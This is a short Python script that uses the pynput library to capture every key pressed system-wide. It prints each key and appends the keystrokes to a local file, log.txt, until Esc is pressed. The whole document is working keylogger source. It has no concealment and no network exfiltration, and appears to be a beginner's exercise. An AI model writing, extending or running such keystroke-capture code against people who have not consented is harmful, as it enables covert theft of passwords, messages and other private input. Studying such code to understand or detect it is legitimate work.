import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []


def on_press_1(key):
    global keys, count


    keys.append(key)
    count += 1
    print(str(key) + " pressed")

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
             x = str(key).replace("'" ," ")
             if x.find('space') > 0:
                 f.write('\n')
             elif x.find('Key') == -1:
                 f.write(x)

             if x.find('backspace') > 0:
                f.write(' <backspace')



def on_release_2(key):
    if key == Key.esc:
        return False


with Listener (on_press=on_press_1, on_release=on_release_2) as listener:
     listener.join()



